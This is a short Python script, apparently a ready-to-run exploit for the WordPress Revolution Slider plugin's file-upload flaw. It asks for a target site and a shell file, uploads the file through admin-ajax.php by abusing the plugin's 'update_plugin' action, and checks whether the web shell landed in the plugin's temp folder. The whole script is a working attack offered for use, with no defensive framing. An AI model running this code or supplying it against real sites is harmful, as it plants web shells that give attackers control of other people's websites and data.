import requests
import sys
import os

#tested True =  exploit work

def main():
	masuk = input("[-] Target => ")
	shell = input("[-] Ur Shell => ")
	payload = {'update_file':open(shell, "rb")}
	headers = {"User-Agent":"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"}
	data = {'action':'revslider_ajax_action', 'client_action':'update_plugin'}
	asu = ("wp-content/revslider/temp/update_extract/revslider/")
	################# exploit #############################
	exploit = (masuk+'/wp-admin/admin-ajax.php')
	nanang = requests.get(exploit, headers=headers).text
	if '0' in nanang:
		exploit = requests.post(exploit, headers=headers, files=payload, data=data)
		checker = requests.get(masuk+asu+shell, headers=headers)
		url = (masuk+asu+shell)
		if checker.status_code != 404:
			print ("[+] Revslider {}" .format(url))
		else:
			print ("[-] Revslider")
	else:
		print ("[-] Revslider")
main()